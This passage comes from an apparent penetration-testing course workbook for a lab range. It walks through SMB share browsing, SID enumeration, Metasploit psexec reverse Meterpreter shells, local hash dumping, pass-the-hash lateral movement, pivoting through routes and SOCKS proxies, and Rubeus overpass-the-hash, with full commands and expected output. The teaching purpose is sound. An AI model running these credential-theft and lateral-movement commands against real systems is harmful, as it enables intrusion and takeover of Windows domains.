This is different from smbexec.py. This is a client used to navigate shares and move files to and from systems. Let's connect to the file server at 10.130.10.44. This time, we are going to use the domain user and the password we discovered earlier in the class. Since this is a domain user, we need to format the username as domain/username. We can still use the password on the command line.

Start an smbclient.py connection with the file server using bgreen.

smbclient.py hiboxy/bgreen:Password1@10.130.10.44

# Expected Results

sec560@560vm:~\$ smbclient.py hiboxy/bgreen:Password1@10.130.10.44 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Type help for list of commands #

We now have an interactive client. This tool works similar to the Linux smbclient command.

First, let's take a look at the help by running help .

help

# Expected Results

# help

open {host,port=445} - opens a SMB connection against the target host/port login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted kerberos\_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name login\_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes logoff - logs off shares - list available shares use {sharename} - connect to an specific share cd {path} - changes the current directory to {path} lcd {path} - changes the current local directory to {path} pwd - shows current remote directory password - changes the user password, the new password will be prompted for input ls {wildcard} - lists all the files in the current directory lls {dirname} - lists all the files on the local filesystem. tree {filepath} - recursively lists all files in folder and sub folders rm {file} - removes the selected file mkdir {dirname} - creates the directory under the current path rmdir {dirname} - removes the directory under the current path put {filename} - uploads the filename into the current path get {filename} - downloads the filename from the current path mget {mask} - downloads all files from the current directory matching the provided mask cat {filename} - reads the filename from the current path mount {target,path} - creates a mount point from {path} to {target} (admin required) umount {path} - removes the mount point at {path} without deleting the directory (admin required) list\_snapshots {path} - lists the vss snapshots for the specified path info - returns NetrServerInfo main results who - returns the sessions currently connected at the target host (admin required) close - closes the current SMB Session exit - terminates the server process (and this session)

Let's take a look at a few of the most commonly used options.

- shares lists available shares •
- use {sharename} connects to a specific share •
- cd {path} changes the current remote directory to {path} •
- lcd {path} changes the current local directory to {path} •
- pwd shows current remote directory •
- ls {wildcard} lists all the files in the current remote directory •
- put {filename} uploads the filname into the current path •

- get {filename} downloads the filename from the current path •
- cat {filename} reads the filename from the current path •
- close closes the current SMB Session •

Let's take a look around the system. Run the shares command.

![](SEC560_WorkBook2_page_87_Figure_4.jpeg)

The shares ending with \$ are hidden shares. In addition, the ADMIN\$, C\$, and IPC\$ are default shares. They are typically only accessible by an admin. Let's look at the FileShare share with the use command.

# This command has no output. Command use FileShare

Examine the files on this share with ls .

# Command ls Expected Results # ls drw-rw-rw- 0 Tue Aug 13 08:15:14 2024 . drw-rw-rw- 0 Tue Aug 13 08:17:12 2024 .. drw-rw-rw- 0 Tue Aug 13 08:15:14 2024 finance drw-rw-rw- 0 Tue Aug 13 08:15:14 2024 people drw-rw-rw- 0 Tue Aug 13 08:15:15 2024 sales

Navigate to the sales/FY-2019/client\_0000022 directory and look at the contents of the directory.

```
Commands
 cd sales/FY-2019/client_0000022
 ls
 Expected Results
   # cd sales/FY-2019/client_0000022
   # ls
   drw-rw-rw- 0 Tue Aug 13 08:15:14 2024 .
   drw-rw-rw- 0 Tue Aug 13 08:15:14 2024 ..
   -rw-rw-rw- 23124 Tue Aug 13 08:15:09 2024 contract_000631.xlsx
   -rw-rw-rw- 53273 Tue Aug 13 08:15:09 2024 nda.docx
   -rw-rw-rw- 120629 Tue Aug 13 08:15:09 2024 sow_000002.docx
   -rw-rw-rw- 120629 Tue Aug 13 08:15:09 2024 sow_000043.docx
   -rw-rw-rw- 120629 Tue Aug 13 08:15:09 2024 sow_000081.docx
   -rw-rw-rw- 120629 Tue Aug 13 08:15:09 2024 sow_000315.docx
```

We can download the files with get .

Download nda.docx.

# This command has no output Command get nda.docx

We can exit the share and see that we have downloaded the file.

# Commands

ls -l nda.docx

exit

# Expected Results

# exit sec560@560vm:~\$ ls -l nda.docx -rw-rw-r-- 1 sec560 sec560 53273 Aug 21 22:07 nda.docx

Let's take at look at one more tool, lookupsid.py.

# *4: lookupsid.py*

The lookupsid.py command will enumerate all the users in the domain. We need to specify a domain user since null/anonymous bind is extremely rare these days. In this case, the target is going to be the domain controller.

lookupsid.py hiboxy/bgreen:Password1@10.130.10.4

# Expected Results

sec560@560vm:~\$ lookupsid.py hiboxy/bgreen:Password1@10.130.10.4 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

- [\*] Brute forcing SIDs at 10.130.10.4
- [\*] StringBinding ncacn\_np:10.130.10.4[\pipe\lsarpc]
- [\*] Domain SID is: S-1-5-21-4148103352-2461449634-48610133

498: HIBOXY\Enterprise Read-only Domain Controllers (SidTypeGroup)

500: HIBOXY\Administrator (SidTypeUser)

501: HIBOXY\Guest (SidTypeUser)

502: HIBOXY\krbtgt (SidTypeUser)

512: HIBOXY\Domain Admins (SidTypeGroup)

513: HIBOXY\Domain Users (SidTypeGroup)

514: HIBOXY\Domain Guests (SidTypeGroup)

515: HIBOXY\Domain Computers (SidTypeGroup)

516: HIBOXY\Domain Controllers (SidTypeGroup)

517: HIBOXY\Cert Publishers (SidTypeAlias)

518: HIBOXY\Schema Admins (SidTypeGroup)

519: HIBOXY\Enterprise Admins (SidTypeGroup)

520: HIBOXY\Group Policy Creator Owners (SidTypeGroup)

...truncate for brevity...

You'll see a lot of output here. The list includes every user ( SidTypeUser) and group ( SidTypeGroup) in the domain.

This is a long list, if we only want a shorter list we can specify a RID to stop before. Run the command again, but add 520 at the end.

lookupsid.py hiboxy/bgreen:Password1@10.130.10.4 520

# Expected Results

sec560@560vm:~\$ lookupsid.py hiboxy/bgreen:Password1@10.130.10.4 520 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

- [\*] Brute forcing SIDs at 10.130.10.4
- [\*] StringBinding ncacn\_np:10.130.10.4[\pipe\lsarpc]
- [\*] Domain SID is: S-1-5-21-4148103352-2461449634-48610133

498: HIBOXY\Enterprise Read-only Domain Controllers (SidTypeGroup)

500: HIBOXY\Administrator (SidTypeUser)

501: HIBOXY\Guest (SidTypeUser)

502: HIBOXY\krbtgt (SidTypeUser)

512: HIBOXY\Domain Admins (SidTypeGroup)

513: HIBOXY\Domain Users (SidTypeGroup)

514: HIBOXY\Domain Guests (SidTypeGroup)

515: HIBOXY\Domain Computers (SidTypeGroup)

516: HIBOXY\Domain Controllers (SidTypeGroup)

517: HIBOXY\Cert Publishers (SidTypeAlias)

518: HIBOXY\Schema Admins (SidTypeGroup)

519: HIBOXY\Enterprise Admins (SidTypeGroup)

This is a great tool to get a list of users in the domain for password guessing!

# Conclusion

As you can see, the Impacket toolset offers a lot of capabilities. We only covered four tools but there are many more! Look here for a description of more such tools.

We'll use these and a few other Impacket tools throughout this course.

# *Lab 4.7: C2 Pivoting and Pass-the-Hash*

# Requires VPN Connection

You must have an active OpenVPN connection using the sec560-labs-range.ovpn file from https://connect.labs.sans.org to complete this exercise.

# Background

Your collection of password hashes from compromised systems reveals an interesting pattern - the same local administrator password hash appears on multiple machines. This presents an opportunity for rapid lateral movement using pass-the-hash techniques.

Using both Metasploit and your C2 infrastructure, you'll demonstrate how NT hashes are as good as passwords for authentication in Windows environments. The pivoting capabilities of your C2 framework will allow you to reach previously inaccessible network segments, while pass-the-hash attacks provide immediate administrative access without needing to crack passwords.

→

# Lab Setup

VMs used:

- Linux •
- Windows 11 •

You should be able to ping 10.130.10.10 from the Linux VM:

ping -c 4 10 .130.10.10

# Expected Results

```
sec560@560vm:~$ ping -c 4 10 .130.10.10
PING 10.130.10.10 (10.130.10.10) 56(84) bytes of data.
64 bytes from 10.130.10.10: icmp_seq=1 ttl=63 time=45.0 ms
64 bytes from 10.130.10.10: icmp_seq=2 ttl=63 time=44.6 ms
64 bytes from 10.130.10.10: icmp_seq=3 ttl=63 time=42.6 ms
64 bytes from 10.130.10.10: icmp_seq=4 ttl=63 time=44.8 ms
--- 10.130.10.10 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3008ms
```

rtt min/avg/max/mdev = 42.607/44.269/45.017/0.968 ms

You should also be able to ping 10.130.10.10 from the Windows VM using the Terminal shortcut on the desktop:

#### Command

ping 10.130.10.10

# Expected Results

PS C:\Users\sec560> ping 10.130.10.10

Pinging 10.130.10.10 with 32 bytes of data:

Reply from 10.130.10.10: bytes=32 time=44ms TTL=63

Reply from 10.130.10.10: bytes=32 time=45ms TTL=63

Reply from 10.130.10.10: bytes=32 time=44ms TTL=63

Reply from 10.130.10.10: bytes=32 time=42ms TTL=63

Ping statistics for 10.130.10.10:

Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),

Approximate round trip times in milli-seconds:

Minimum = 42ms, Maximum = 45ms, Average = 43ms

# Lab – Step-by-Step Instructions

For this lab, you will attack 10.130.10.5 use the credentials we found earlier ( bgreen/ Password1). You'll grab the password hashes, and then try to use those hashes to access other systems.

The whole point of this lab is that you can grab *LM* and *NT* hashes and use them for admin access of a target machine without even cracking them. Note that as you proceed through this lab, you never need to know what the actual value of the password of another account. You simply use its hashed form to gain access.

![](SEC560_WorkBook2_page_94_Figure_1.jpeg)

#### *1: Obtaining Hashes*

Use Metasploit and the psexec module to establish a session on 10.130.10.5 using the credentials we discovered earlier. First, start Metasploit inside the Linux VM.

![](SEC560_WorkBook2_page_94_Figure_4.jpeg)

Configure Metasploit to target 10.130.10.5 using the credentials we found before:

use exploit/windows/smb/psexec set smbuser bgreen set smbpass Password1 set smbdomain hiboxy set rhosts 10.130.10.5 set lhost tun0

# Expected Results

msf6 > use exploit/windows/smb/psexec [\*] No payload configured, defaulting to windows/meterpreter/reverse\_tcp msf6 exploit(windows/smb/psexec) > set smbuser bgreen smbuser => bgreen msf6 exploit(windows/smb/psexec) > set smbpass Password1 smbpass => Password1 msf6 exploit(windows/smb/psexec) > set smbdomain hiboxy smbdomain => hiboxy msf6 exploit(windows/smb/psexec) > set rhosts 10.130.10.5 rhosts => 10.130.10.5 msf6 exploit(windows/smb/psexec) > set lhost tun0 lhost => tun0

Confirm your settings in Metasploit:

# Command show options Expected Results msf6 exploit(windows/smb/psexec) > show options Module options (exploit/windows/smb/psexec): Name Current Setting Required Description ---- --------------- -------- ----------- SERVICE\_DESCRIPTION no Service description to be used on target for pretty listing SERVICE\_DISPLAY\_NAME no The service display name SERVICE\_NAME no The service name SMBSHARE no The share to connect to, can be an admin share (ADMIN\$,C\$,...) or a normal read/write folder share Used when connecting via an existing SESSION: Name Current Setting Required Description ---- --------------- -------- ----------- SESSION no The session to run this module on Used when making a new connection via RHOSTS: Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.130.10.5 no The target host(s), see https://docs.metasploit.com/ docs/using-metasploit/basics/using-metasploit.html RPORT 445 no The target port (TCP) SMBDomain hiboxy no The Windows domain to use for authentication SMBPass Password1 no The password for the specified username SMBUser bgreen no The username to authenticate as [...trimmed for brevity...]

Now it's time to exploit the target!

run

# Expected Results

msf6 exploit(windows/smb/psexec) > run

- [\*] Started reverse TCP handler on 10.254.252.3:4444
- [\*] 10.130.10.5:445 Connecting to the server...
- [\*] 10.130.10.5:445 Authenticating to 10.130.10.5:445|hiboxy as user 'bgreen'...
- [\*] 10.130.10.5:445 Selecting PowerShell target
- [\*] 10.130.10.5:445 Executing the payload...
- [+] 10.130.10.5:445 Service start timed out, OK if running a command or non-service executable...
- [\*] Sending stage (177734 bytes) to 10.130.10.5
- [\*] Meterpreter session 1 opened (10.254.252.3:4444 -> 10.130.10.5:53217) at 2024-08-21 22:50:41 +0000

meterpreter >

Let's get the local Windows hashes with the post/windows/gather/hashdump module.

run post/windows/gather/hashdump

# Expected Results

meterpreter > run post/windows/gather/hashdump

- [\*] Obtaining the boot key...
- [\*] Calculating the hboot key using SYSKEY 53d647a08214cf86fa452c05bfa8d1eb...
- [\*] Obtaining the user list and keys...
- [\*] Decrypting user keys...
- [\*] Dumping password hints...

No users with password hints on this system

[\*] Dumping password hashes...

Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdbcafd1792ab37c71243a2e9c8a6acf::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:d7da45674bae3a0476c0f64b67121f7d::: SROCAdmin:1000:aad3b435b51404eeaad3b435b51404ee:2e920723943f81ec0af0fd735f737fef:::

antivirus:1001:aad3b435b51404eeaad3b435b51404ee:47f0ca5913c6e70090d7b686afb9e13e:::

slopez:1002:aad3b435b51404eeaad3b435b51404ee:87e968ead530264915a4b295c57c37d5::: aparker:1003:aad3b435b51404eeaad3b435b51404ee:9b5684b030226a1203e4e7b718a3f9df::: rgray:1004:aad3b435b51404eeaad3b435b51404ee:23d26a03aa7102abce4805d88e568a78::: wrobinson:1005:aad3b435b51404eeaad3b435b51404ee:5deaec4b57b859c25cdd0513fb7bc750::: mlara:1006:aad3b435b51404eeaad3b435b51404ee:d8d9eee954da5f2d42fe72f862fa493f::: lstout:1007:aad3b435b51404eeaad3b435b51404ee:ca3f0e9ce3188b0602742da2976d6773::: tandersen:1008:aad3b435b51404eeaad3b435b51404ee:bf459116e5854e34031997be8e13596d::: awalker:1009:aad3b435b51404eeaad3b435b51404ee:fe1f27a2561b61511588b0d24e333a7c::: mmiller:1010:aad3b435b51404eeaad3b435b51404ee:7a1f1fd59eb2b97041c74748ea6a68f8::: vcollins:1011:aad3b435b51404eeaad3b435b51404ee:5bd9b7b6fce76d3aabfebee9debaa932::: ...truncated for brevity...

We're going to take a look at the line beginning with antivirus . This account looks generic, so let's try to use that hash on other systems.

#### *2: Using the Hashes*

We'll use the psexec module again. Let's set up the account first.

background set smbuser antivirus

# Expected Results

meterpreter > background [\*] Backgrounding session 1... msf6 exploit(windows/smb/psexec) > set smbuser antivirus smbuser => antivirus

We need to set the password for this account. We don't know the original password, so we need to use the hashes. Scroll back up and grab the hashes (both LM and NT, including the : in the middle). Then paste the hash after set SMBPass.

#### Command

set SMBPass aad3b435b51404eeaad3b435b51404ee:47f0ca5913c6e70090d7b686afb9e13e

# Expected Results

sf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee: 47f0ca5913c6e70090d7b686afb9e13e SMBPass => aad3b435b51404eeaad3b435b51404ee:47f0ca5913c6e70090d7b686afb9e13e

Recall from our Nmap scan that there are 6 other hosts (not counting the system we have access to) that are listening on port 445:

- 10.130.10.4 •
- 10.130.10.5 (this is the host we've already compromised) •
- 10.130.10.7 •
- 10.130.10.21 •
- 10.130.10.23 •
- 10.130.10.25 •
- 10.130.10.44 •

For simplicity, we'll stick with 10.130.10.21. We can set the RHOSTS option accordingly.

set RHOSTS 10.130.10.21

# Expected Results

msf6 exploit(windows/smb/psexec) > set RHOSTS 10.130.10.21 RHOSTS => 10.130.10.21

Confirm the options.

# Command

show options

#### Expected Results

msf6 exploit(windows/smb/psexec) > show options ...truncated for brevity...

Used when making a new connection via RHOSTS:

Name Current Setting Required Description

---- --------------- -------- -----------

RHOSTS 10.130.10.21 no

The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/usingmetasploit.html

RPORT 445 no The target port

(TCP)

SMBDomain hiboxy no

The Windows domain to use for authentication

SMBPass aad3b435b51404eeaad3b435b51404ee:47f0ca5913c6e70090d7b686afb9e13e no

The password for the specified username

SMBUser antivirus no

The username to authenticate as

...truncated for brevity...

Let's now try to use this hash and exploit the target!

# *3: Exploit*

Finally, use the run command to attack the target:

# Command run Expected Results msf6 exploit(windows/smb/psexec) > run [\*] Started reverse TCP handler on 10.254.252.2:4444 [\*] 10.130.10.21:445 - Connecting to the server... [\*] 10.130.10.21:445 - Authenticating to 10.130.10.21:445|hiboxy.com as user 'antivirus'... [\*] 10.130.10.21:445 - Selecting PowerShell target [\*] 10.130.10.21:445 - Executing the payload... [+] 10.130.10.21:445 - Service start timed out, OK if running a command or non-service executable... [\*] Sending stage (177734 bytes) to 10.130.10.21 [\*] Meterpreter session 2 opened (10.254.252.2:4444 -> 10.130.10.21:59846) at 2024-08-22 16:26:51 +0000

The highlighted lines above show that we have access to the .21, just by using the hash!

![](SEC560_WorkBook2_page_101_Figure_2.jpeg)

If the pass-the-hash attack works, you should get Meterpreter access to the target machine. You can confirm by looking at your prompt -- it should begin with meterpreter > .

#### *4: Meterpreter Pivoting*

As far as those target Windows machine knows, you authenticated legitimately. The on-prem authentication protocols (LANMAN Challenge/Response, NTLMv1, NTLMv2, and Kerberos) all use the password hash as the shared secret, not the password. You just used the hash instead of the password.

You can now run any of the Meterpreter commands we discussed earlier in the course.

sysinfo getuid ifconfig

# Expected Results

meterpreter > sysinfo Computer : JUMP01

OS : Windows Server 2022 (10.0 Build 20348).

Architecture : x64 System Language : en\_US Domain : HIBOXY Logged On Users : 9

Meterpreter : x86/windows

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM

meterpreter > ifconfig [...truncated for brevity...]

Interface 8 ============

Name : Intel(R) 82599 Virtual Function

Hardware MAC : 06:6e:a0:1c:ae:d1

MTU : 1500

IPv4 Address : 10.130.10.21 [...truncated for brevity...]

# Information

Your Hardware MAC output will be different than the above.

Let's load a new meterpreter extension to help us understand what access we have on the JUMP01, our victim machine. Extensions are DLLs that you can load into a running meterpreter session for added functionality:

help load load -l load powershell

# Expected Results

meterpreter > help load Usage: load ext1 ext2 ext3 ...

Loads a meterpreter extension module or modules.

### OPTIONS:

- -h Help menu.
- -l List all available extensions.

meterpreter > load -l

bofloader

espia

extapi

incognito

kiwi

lanattacks

peinjector

powershell

priv

python

sniffer

stdapi

unhook

winpmem

meterpreter > load powershell

Loading extension powershell...Success

Now that we've loaded a new extension, Metasploit updates the help command to show the new commands available to us:

# Command help Expected Results meterpreter > help [...prior output skipped...] Powershell Commands =================== Command Description ------- ---------- powershell\_execute Execute a Powershell command string powershell\_import Import a PS1 script or .NET Assembly DLL powershell\_session\_remove Remove/clear a session (other than default) powershell\_shell Create an interactive Powershell prompt

For now, we'll run a one-off command to verify that we can see the elusive 10.130.11.0/24 range directly from the compromised machine.

![](SEC560_WorkBook2_page_104_Figure_2.jpeg)

Excellent! We've verified that our victim machine (JUMP01) can reach 10.130.11.13 on port 445. Next, let's set up Metasploit's own routing capabilities.

We can either background our meterpreter session and use the route add command, or we can use the autoroute command to automatically route tra ffic through the meterpreter session. Since 10.130.11.13 is in a different /24 subnet than 10.130.10.21 (note the 11 in the third octet, instead of a 10), route add will be easier.

![](SEC560_WorkBook2_page_105_Figure_0.jpeg)

Using -1 (negative one) as the session number is a shortcut telling Metasploit to use the highest-numbered active meterpreter session. Often, this would be the most recent session.

Next, we'll show that 10.130.11.13 is now reachable through any Metasploit module. We'll start with a classic: auxiliary/ scanner/smb/smb\_version.

use auxiliary/scanner/smb/smb\_version set RHOSTS 10.130.11.13 run

# Expected Results

msf6 auxiliary(scanner/smb/smb\_version) > run

[\*] 10.130.11.13:445 - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:LZNT1, Pattern\_V1) (encryption capabilities:AES-256-GCM) (signatures:optional) (guid:{7fbcf81e-7025-458d-a194-272c76cbc015}) (authentication domain:HIBOXY)

[+] 10.130.11.13:445 - Host is running Version 10.0.20348 (likely Windows Server 2022)

[\*] 10.130.11.13 - Scanned 1 of 1 hosts (100% complete)

[\*] Auxiliary module execution completed msf6 auxiliary(scanner/smb/smb\_version) >

# Information

Your guid: output above will vary.

Great! We've shown that Metasploit modules can now reach the 10.130.11.0/24 subnet transparently through our meterpreter session.

While we could use the psexec module to attack 10.130.11.13 (and it's a good bonus for the lab!), let's instead show how to pivot using SSH instead of meterpreter.

Go ahead and exit this Metasploit session, to prepare for the next section:

#### Command

exit -y

#### Expected Results

msf6 auxiliary(scanner/smb/smb\_version) > exit -y sec560@560vm:~\$

#### *5: Metasploit via SOCKS Proxying*

Let's show how to pivot using SSH, instead of pivoting through a Meterpreter session with Metasploit's own routing. Remember, Metasploit is an exploitation framework -- while it does happen to have its own C2 (meterpreter), its exploitation capabilities are the majority of Rapid7's focus.

First, let's SSH into one of the hosts in the 10.130.10.0/24 subnet that can reach the 10.130.11.0/24 subnet. We'll use the bgreen account and the Password1 password. If you've already completed Lab 4.5, you may have already set up SSH key-based authentication and may not have to enter the password.

# Command

ssh -D 1080 bgreen@10.130.10.22

# Expected Results

sec560@560vm:~\$ ssh -D 1080 bgreen@10.130.10.22

Warning: Permanently added '10.130.10.22' (ECDSA) to the list of known hosts.

Last login: Sat Apr 13 03:55:37 2024 from 10.254.252.3

bgreen@jump02:~\$

# Warning

The SSH client must remain open for the SOCKS proxy to remain available. Do not exit your SSH session on 10.130.10.22, and instead open a new terminal window or tab for the next step.

#### Open a new terminal window for the next step!

Next, we'll set up Metasploit to use the SOCKS proxy we just created. We'll use the auxiliary/scanner/smb/smb\_version module to scan the 10.130.11.0/24 subnet in its entirety.

msfconsole -q setg Proxies socks5:127.0.0.1:1080 use auxiliary/scanner/smb/smb\_version set RHOSTS 10.130.11.1-20 set THREADS 20 run

# Expected Results

sec560@560vm:~\$ msfconsole -q msf6 > setg Proxies socks5:127.0.0.1:1080 Proxies => socks5:127.0.0.1:1080 msf6 > use auxiliary/scanner/smb/smb\_version msf6 auxiliary(scanner/smb/smb\_version) > set RHOSTS 10.130.11.1-20 RHOSTS => 10.130.11.1-20 msf6 auxiliary(scanner/smb/smb\_version) > set THREADS 20 THREADS => 20 msf6 auxiliary(scanner/smb/smb\_version) > run

[\*] 10.130.11.13:445 - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:LZNT1, Pattern\_V1) (encryption capabilities:AES-256-GCM) (signatures:optional) (guid:{7fbcf81e-7025-458d-a194-272c76cbc015}) (authentication domain:HIBOXY)

[+] 10.130.11.13:445 - Host is running Version 10.0.20348 (likely Windows Server 2022)

[\*] 10.130.11.1-20:445 - Scanned 2 of 20 hosts (10% complete)

[\*] 10.130.11.1-20:445 - Scanned 19 of 20 hosts (95% complete)

[\*] 10.130.11.1-20:445 - Scanned 20 of 20 hosts (100% complete)

[\*] Auxiliary module execution completed

# Information

The percentage complete will vary based on the speed of your network connection and the target systems' responsiveness. As before, your guid: output will vary as well.

Though not every Metasploit module supports the Proxies variable, nearly all do. While here we're using SSH to provide the SOCKS proxy, many C2 frameworks have built-in SOCKS proxying capabilities as well. Since we've setg Proxies , we've set the variable globally, across all modules.

As our crescendo, let's Pass-the-Hash to the antivirus account on 10.130.11.13 using the psexec module:

```
use exploit/windows/smb/psexec
set RHOSTS 10.130.11.13
set LHOST tun0
set LPORT 4401
set SMBUser antivirus
set SMBDomain hiboxy.com
set SMBPass aad3b435b51404eeaad3b435b51404ee:47f0ca5913c6e70090d7b686afb9e13e
set ReverseAllowProxy true
run
```

# Expected Results

```
msf6 auxiliary(scanner/smb/smb_version) > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.130.11.13
RHOSTS => 10.130.11.13
msf6 exploit(windows/smb/psexec) > set LHOST tun0
LHOST => tun0
msf6 exploit(windows/smb/psexec) > set LPORT 4401
LPORT => 4401
msf6 exploit(windows/smb/psexec) > set SMBUser antivirus
SMBUser => antivirus
msf6 exploit(windows/smb/psexec) > set SMBDomain hiboxy.com
SMBDomain => hiboxy.com
msf6 exploit(windows/smb/psexec) > set SMBPass aad3b435b51404eeaad3b435b51404ee:
47f0ca5913c6e70090d7b686afb9e13e
SMBPass => aad3b435b51404eeaad3b435b51404ee:47f0ca5913c6e70090d7b686afb9e13e
msf6 exploit(windows/smb/psexec) > set ReverseAllowProxy true
ReverseAllowProxy => true
msf6 exploit(windows/smb/psexec) > run
[*] Started reverse TCP handler on 10.254.252.3:4401 
[*] 10.130.11.13:445 - Connecting to the server...
[*] 10.130.11.13:445 - Authenticating to 10.130.11.13:445|hiboxy.com as user 'antivirus'...
[*] 10.130.11.13:445 - Selecting PowerShell target
[*] 10.130.11.13:445 - Executing the payload...
[+] 10.130.11.13:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 10.130.11.13
[*] Meterpreter session 3 opened (10.254.252.3:4401 -> 10.130.11.13:54166) at 2024-04-17 03:32:03 +0000
meterpreter >
```

In case you're wondering, yes, Metasploit does use the same variable for a password hash as it does for a password ( SMBPass), and technically if the actual password were 32 hexadecimal characters, followed by a colon, followed by another 32 hexadecimal characters... Metasploit would erroneously treat it as a hash. Most tools use a separate argument when authenticating using a password hash, such as our next example, Impacket.

#### *6: Passing the Hash with Impacket*

Next, we'll show how the Impacket example tools can use password hashes for network authentication, instead of the actual password. From a network perspective, again, the password hash is the shared secret, not the password itself. In a challenge/ response protocol, the server is asking you to prove access to the password *hash* using the server-generated challenge, not the password. To rephrase, the secret in "shared secret" is the hash, which is why we can refer to both hashes and passwords as "credential material" generically.

All the \*exec.py tools use the same syntax for the domain, username, and target: DOMAIN/USERNAME@TARGET . You can supply the credential material (password, password hash, or Kerberos ticket) as follows:

- Password: You can include the password in the format DOMAIN/USERNAME:PASSWORD@TARGET . Since the bash shell itself will process some special characters (like # to comment the remainder of the line), a safe approach is to wrap the entire string in single quotes. For example, 'DOMAIN/USERNAME:PASSWORD@TARGET' . •
- Password Hash: You can include the password hash by specifying a separate -hashes argument, followed by the LM:NT hash pair, separated by a colon. For example, 'DOMAIN/USERNAME@TARGET' -hashes LM:NT . •

Tools like secretsdump and Metasploit's post/windows/gather/hashdump also output hashes with the LanMan and NT hashes separated by a colon, so you can copy and paste them directly into the Impacket tools. The full format of this hash output is sometimes referred to as the "John the Ripper" format, and is shown below:

username:uid:lm\_hash:nt\_hash::: Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

Some tools leave off the trailing ::: . The Administrator's password in the example above is blank. The LM hash beginning with aad3b represents a blank password, and the NT hash beginning with 31d6c is the hash of a blank password. Whether Windows will store LM hashes is a complicated question.

The LM hash is not stored (or rather, a blank hash is stored) in the following situations:

- By default on Windows Vista / Server 2008 and later (though storage of LM hashes can be re-enabled) •
- If the password is longer than 14 characters (the password is not truncated to 14 characters; the LM hash is simply stored as if it were blank) •
- If Credential Guard is enabled (which is default on Windows 11 22H2 and later, for devices that meet the hardware requirements). If Credential Guard is enabled, it will even ignore the registry setting to store LM hashes. •

Windows will choose whether to store the LM hash upon password change. Since domain controllers are generally migrated over time, it's common for enterprises to still have LM hashes on domain accounts. Which accounts? Whichever accounts whose passwords haven't changed since Windows Server 2003 R2 (or below) was the domain controller operating system.

For now, though, we'll use the psexec.py tool to pass the hash to the antivirus account on 10.130.10.21.

# Open a new terminal window for the next step!

psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:47f0ca5913c6e70090d7b686afb9e13e hiboxy/ antivirus@10.130.10.21 cmd.exe

# Expected Results

sec560@560vm:~\$ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:47f0ca5913c6e70090d7b686afb9e13e hiboxy/antivirus@10.130.10.21 cmd.exe

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

- [\*] Requesting shares on 10.130.10.21.....
- [\*] Found writable share ADMIN\$
- [\*] Uploading file NiBCZVMy.exe
- [\*] Opening SVCManager on 10.130.10.21.....
- [\*] Creating service BlnS on 10.130.10.21.....
- [\*] Starting service BlnS.....
- [!] Press help for extra shell commands

Microsoft Windows [Version 10.0.20348.2582]

(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>

As discussed in our previous lab on Impacket, the different \*exec.py scripts from Impacket have different tradecraft and operational tradeoffs. When performing challenge-response network authentication (using LM Challenge/Response, NTLMv1, NTLMv2, or Kerberos), the -hashes argument is the Impacket way of specifying the hash instead of the password.

# *7: "Overpass-the-Hash" with Rubeus*

# Online Exercise

Switch to your Windows VM for this next step! You can open Chrome from the Windows VM desktop, where the home page is the Electronic Workbook.

Next, let's show how to "overpass-the-hash" inside *any* Windows process, using Rubeus. Kerberos attacks get fancy names for different techniques, and this is one of them. In this case, we're logging on (receiving a TGT) as the antivirus user, using the hiboxy\antivirus password hash. This is especially useful for non-domain joined machines, such as an Assumed Breach endpoint provided by the penetration tester.

You'll need to connect your Windows VM to OpenVPN for this step. After connecting via OpenVPN, you should be able to ping 10.130.10.10 from the Windows 10 VM:

ping 10.130.10.10

# Expected Results

PS C:\Users\sec560> ping 10.130.10.10

Pinging 10.130.10.10 with 32 bytes of data: Reply from 10.130.10.10: bytes=32 time=41ms TTL=127 Reply from 10.130.10.10: bytes=32 time=41ms TTL=127 Reply from 10.130.10.10: bytes=32 time=43ms TTL=127 Reply from 10.130.10.10: bytes=32 time=43ms TTL=127

Ping statistics for 10.130.10.10: Packets: Sent = 4, Received = 4, Lost = 0 (0% loss), Approximate round trip times in milli-seconds: Minimum = 41ms, Maximum = 43ms, Average = 42ms PS C:\Users\sec560>

# OpenVPN

If you're unable to ping 10.130.10.10, you'll need to connect to the OpenVPN server before continuing.

Open a PowerShell window prompt by clicking the Terminal shortcut on your Windows VM desktop, then type the following commands:

| Command                                                                                                                                        |
|------------------------------------------------------------------------------------------------------------------------------------------------|
| psexec \\10.130.10.21 cmd.exe Rubeus.exe asktgt /user:antivirus /domain:hiboxy.com /dc:10.130.10.4 /rc4:47f0ca5913c6e70090d7b686afb9e13e / ptt |
|                                                                                                                                                |
|                                                                                                                                                |
|                                                                                                                                                |
|                                                                                                                                                |
|                                                                                                                                                |
|                                                                                                                                                |
|                                                                                                                                                |
|                                                                                                                                                |
|                                                                                                                                                |
|                                                                                                                                                |
|                                                                                                                                                |
|                                                                                                                                                |
|                                                                                                                                                |
|                                                                                                                                                |
